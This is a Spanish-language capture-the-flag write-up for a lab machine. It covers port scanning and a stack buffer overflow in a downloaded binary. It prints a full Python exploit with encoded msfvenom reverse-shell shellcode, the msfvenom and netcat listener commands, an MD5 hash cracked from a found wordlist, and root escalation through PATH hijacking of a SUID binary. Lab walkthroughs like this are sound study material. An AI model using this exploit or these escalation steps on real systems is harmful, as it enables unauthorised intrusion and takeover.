## ESQUEMA

![insecure](https://github.com/user-attachments/assets/bf107b15-dc80-416b-9931-5f3cb7b7d8e3)

## RECONOCIMIENTO DE RED

### conectividad y SO

Antes de empezar con la máquina, usamos `ping` para comprobar si tenemos conectividad:

```python
ping -c 1 172.17.0.2
```

![image](https://github.com/user-attachments/assets/66385427-64ec-4b28-bddb-ff8c1834eb77)

Vemos que nos llega respuesta. Además, como el TTL es 64, el sistema operativo probablemente sea Linux.

### puertos y servicios

Hacemos un escaneo de todo el rango de puertos por TCP con nmap:

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports
```

> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

![image](https://github.com/user-attachments/assets/e3dfd4f9-d17e-4d36-ae0f-5552810c3d67)

#### puertos abiertos

**80 - TCP - HTTP**

**20201 - TCP - ???**

Ahora sobre estos dos puertos lanzamos un escaneo de versiones y scripts de reconocimiento estándar con nmap:

```python
nmap -p80,20201 -sCV 172.17.0.2 -oN targeted
```

> `-p80,20201` hacer el escaneo solo sobre estos dos puertos

> `-sCV` lanzar escaneo de versiones y scripts estándar de reconocimiento

> `-oN targeted` exportar el output al archivo `targeted`, en formato nmap

![image](https://github.com/user-attachments/assets/03736360-e1c8-4918-a036-2afe66b16bda)

## RECONOCIMIENTO WEB

Desde consola hacemos `whatweb http://172.17.0.2`:

![image](https://github.com/user-attachments/assets/e46523e9-995a-436c-a0ff-19471148e97b)

No vemos nada interesante. Cargamos la web en el navegador:

![image](https://github.com/user-attachments/assets/c4314a66-6092-4782-a171-59237a17593f)

Vemos esta web que tiene un botón de descarga. Si clickamos, se nos descarga un archivo llamado "secure_software".

## BUFFER OVERFLOW

### LOCAL

Si ejecutamos `file secure_software`:

![image](https://github.com/user-attachments/assets/1f6e6043-6353-4809-8278-5c93c9089e88)

Vemos que es un binario ejecutable de 32 bits. Si lo ejecutamos, vemos esto:

![image](https://github.com/user-attachments/assets/d68126ec-558e-44ef-8924-2f6ac4e060e6)

Parece que el binario está escuchando por el puerto 20201, justo el que también tiene la máquina víctima, por lo que podemos deducir que la máquina víctima está ejecutando un binario como este y por eso descubrimos el puerto 20201.

Si probamos a conectarnos a nuestra máquina por el puerto 20201, haciendo `telnet 127.0.0.1 20201`:

![image](https://github.com/user-attachments/assets/284e7796-0874-4e48-92f2-fd0b6faefcfe)

Vemos que nos pide un input. Ponemos cualquier cosa, y nos pone que se ha recibido la data correctamente:

![image](https://github.com/user-attachments/assets/1d1fc1e8-d5c3-481e-9915-49263a1b460d)

Podemos generar 500 bytes usanndo (pattern_generator)[https://github.com/4bytess/pattern_generator]

```python
pattern.py -m generate -v 500
```

Y probar a enviarlos al binario:

![image](https://github.com/user-attachments/assets/602f3e61-4340-4daf-8b93-404931bb0358)

Vemos que se envía la data, pero el servidor ya no responde con "Data received correctly", por lo que parece ser que ha ocurrido un buffer overflow. Además, en la ventana del binario vemos que da una señal SIGSEV:

![image](https://github.com/user-attachments/assets/1d2352a5-ac89-4b01-a347-1541c9ba93ea)

Ya sabemos que hemos conseguido hacer un buffer overflow. Ahora tenemos que pensar en que derivarlo. Para ver las medidas de seguirdad que tiene el binario, hacemos `checksec ./secure_software`:

![image](https://github.com/user-attachments/assets/1d2352a5-ac89-4b01-a347-1541c9ba93ea)

Vemos que no tiene PIE, ni Canaries, ni tampoco protección de ejecución de Stack. Entonces podemos derivar el buffer overflow en una ejecución de shellcode.

Para diseñar el exploit, antes de nada tenemos que ganar control del registro EIP. Para hacer esto, generamos un patrón de 500 bytes otra vez:

```python
pattern.py -m generate -v 500
```

Pero esta vez iniciamos el binario con GDB. Hacemos `gdb secure_software`, y dentro de la consola del debugger ejecutamos `run`. Después de esto, nos conectamos otra vez por telnet y enviamos el patrón de 500 bytes. En la ventana del debugger veremos esto:

![image](https://github.com/user-attachments/assets/257fff5f-cfa4-47d9-b49f-7d9add7d6b5d)

Vemos que el registro EIP vale 0x62313262, que en ASCII es b21b. Para calcular el offset con esta información, ejecutamos:

```python
pattern.py -m offset -v b21b
```

![image](https://github.com/user-attachments/assets/18f0dec1-27e1-4fde-b56d-8109fc07d163)

Y devuelve que el offset es 300, por lo que ya sabemos que si enviamos 300 bytes de input al binario, los siguientes 4 bytes son los que valdrá el registro EIP.

Ya sabemos el offset, pero nos queda buscar una dirección dentro del binario que apunte a una instrucción `jmp esp`, la cual nos permitirá ejecutar el Stack, donde estará el shellcode. Para buscar esta instrucción usamos `ropper`:

```python
ropper --file secure_software --search "jmp esp"
```

![image](https://github.com/user-attachments/assets/8d1fff5a-f157-4947-be45-344b56012a16)

Vemos que la dirección 0x08049213 apunta a una instrucción `jmp esp`. No tenemos que preocuparnos de que esta dirección cambie, ya que como hemos visto antes, el binario no usa PIE, lo que significa que no hay aleatorización del código del binario cada vez que se ejecuta.

Ahora tenemos lo necesario para diseñar el exploit que nos envie la reverse shell:

```python
#!/usr/bin/python3

from pwn import p32 # función para poder representar direcciones de 32 bits en formato LSB
import socket # librerá para uso de sockets

shellcode = (b"\xdb\xde\xbd\x93\x2f\xcf\xc7\xd9\x74\x24\xf4\x5f\x29\xc9"
b"\xb1\x12\x83\xc7\x04\x31\x6f\x13\x03\xfc\x3c\x2d\x32\x33"
b"\x98\x46\x5e\x60\x5d\xfa\xcb\x84\xe8\x1d\xbb\xee\x27\x5d"
b"\x2f\xb7\x07\x61\x9d\xc7\x21\xe7\xe4\xaf\xce\x17\x17\x2e"
b"\x59\x1a\x17\x31\x22\x93\xf6\x81\x32\xf4\xa9\xb2\x09\xf7"
b"\xc0\xd5\xa3\x78\x80\x7d\x52\x56\x56\x15\xc2\x87\xb7\x87"
b"\x7b\x51\x24\x15\x2f\xe8\x4a\x29\xc4\x27\x0c") # shellcode que nos enviará la reverse shell

before_eip = b'A' * 300 # 300 bytes de relleno para llegar al registro EIP
eip = p32(0x08049213) # dirección que apunta a la instrucción jmp esp
after_eip = b'\x90' * 32 # 32 instrucciones NOP para poder ejecutar correctamente el shellcode

payload = before_eip + eip + after_eip + shellcode # juntamos todo

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creamos un socket por IPv4 y TCP

sock.connect(('127.0.0.1', 20201)) # lo conectamos a nuestra máquina por el puerto 20201

sock.recv(1024) # recibimos el texto "Enter data:"

sock.send(payload + b'\r\n') # enviamos el payload
 
sock.close() # cerramos el socket
```

El shellcode lo podemos generar con `msfvenom`:

```python
msfvenom -p linux/x86/shell_reverse_tcp --platform linux -a x86 LHOST=127.0.0.1 LPORT=443 -f c -e x86/shikata_ga_nai EXITFUNC=thread
```

Ahora nos ponemos en escucha por el puerto 443 con `nc -nlvp 443`, ejecutamos el binario en local, y ejecutamos el exploit:

![image](https://github.com/user-attachments/assets/be166f4a-9fa0-4011-a9d4-94ba35d376d3)

Y vemos que recibimos la reverse shell, desde 127.0.0.1 a 127.0.0.1, ya que hemos hecho esta prueba solamente para ver como se explota este buffer overflow. Ahora que sabemos como funciona, para ganar la reverse shell desde la máquina víctima simplemente generamos un nuevo shellcode que tenga como LHOST 172.17.0.1 y dentro del exploit cambiamos `sock.connect(('127.0.0.1', 20201))` por `sock.connect(('172.17.0.2', 20201))`.

Nos ponemos en escucha por el puerto 443, y ejecutamos el nuevo exploit:

![image](https://github.com/user-attachments/assets/6639096b-9071-4d33-af7f-6da7980cff8f)

Y recibimos la reverse shell de la máquina víctima.

## TRATAMIENTO TTY

```python
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows <filas> columns <columnas>
```

Para ver el número de filas y columnas que usa tu pantalla, ejecutas `stty -a`.

## ESCALADA DE PRIVILEGIOS (JOHNTHERIPPER)

Ganamos acceso como el usuario securedev. Si vamos a `/home/securedev` y hacemos `ls`, vemos un el propio binario que acabamos de explotar, y además vemos un archivo llamado "hashfile":

![image](https://github.com/user-attachments/assets/062e5e62-51c8-416c-ace1-841b0733e950)

Vemos que habla de un usuario llamado johntheripper, y nos da un hash MD5. Si hacemos `cat /etc/passwd` vemos que existe este usuario llamado johntheripper. Podría ser que este hash sea su contraseña. Si intentamos crackear el hash con `john` usando el rocykou.txt, no podemos. Tampoco con ninguna web. Esto se debe a que el valor en texto plano del hash no se encuentra en el diccionario rockyou.txt o en el que usen las webs.

Si ejecutamos `find / -user johntheripper 2>/dev/null` para ver que archivos existen en propiedad de este usuario, vemos esto:

![image](https://github.com/user-attachments/assets/1564d13f-af55-470c-beaa-f5eec776a0b8)

Hay un archivo oculto en `/opt/.hidden` llamado `words`:

![image](https://github.com/user-attachments/assets/b5ec825d-bed4-4e7d-8a37-1d43e031bd15)

Parece ser una lista de palabras que le gustan al usuario johntheripper. Podríamos usar esto como una especie de rainbow table para intentar crackear el hash de antes. Vamos haciendo por cada palabra del archivo `words`: `echo -n "<palabra>" | md5sum` y si el hash resultante es igual al que contiene el archivo hashfile, entonces el hash del archivo hashfile en texto plano equivale a la palabra.

Si vamos probando cada una, veremos que la palabra tset0tevst! en MD5 es igual al hash de hashfile. Entonces tset0tevst! podría ser la contraseña del usuario johnheripper. Probamos a hacer `su johntheripper` y ponemos de contraseña tset0tevst!, y conseguimos cambiarnos a este usuario.

## ESCALADA DE PRIVILEGIOS (ROOT)

Siendo el usuario johntheripper, si vamos a `/home/johntheripper`, veremos un ejecutable llamado `show_files`, que además es SUID y su propietario es root:

![image](https://github.com/user-attachments/assets/a08a9b6e-b8ec-4a4d-85af-a09fb21fd08a)

Si lo ejecutamos, vemos que devuelve el output similar a si ejecutásemos el comando `ls`:

![image](https://github.com/user-attachments/assets/8103701e-f72c-4245-a2aa-e121b025651e)

Podría ser que el ejecutable esté ejecutando el comando `ls` para listar el contenido del directorio actual. Lo que no sabemos es si lo hace de forma absoluta (`/usr/bin/ls`) o relativa (`ls`). Si lo hace de forma relativa supone un problema, ya que podríamos hacer un ataque Path Hijacking, modificando el path y creando un archivo `ls` malicioso que se encuentre antes de `/usr/bin/ls` y que nos de una bash privilegiada.

Podemos crear nuestro archivo ls en `/home/johntheripper` por ejemplo:

![image](https://github.com/user-attachments/assets/8a33828c-3ad5-49c1-bc28-f0cc5f909c9d)

Dentro del archivo creamos un script en bash que nos de una bash privilegiada, para aprovecharnos del SUID.

Después de esto, modificamos el Path de esta forma: `export PATH=/home/johntheripper:$PATH`. De esta forma, al ejecutar `ls` de forma relativa, al estar nuestra ruta maliciosa antes que `/usr/bin`, se va a usar nuestro archivo malicioso. Muy importante hacer `chmod +x ./ls`, ya que si nuestro archivo no es ejecutable, no se le va a encontrar.

Una vez hecho todo esto, hacemos `./show_files`:

![image](https://github.com/user-attachments/assets/4ff4dbec-2943-4d4e-919e-0636caca2f65)

Y ganamos una bash como root.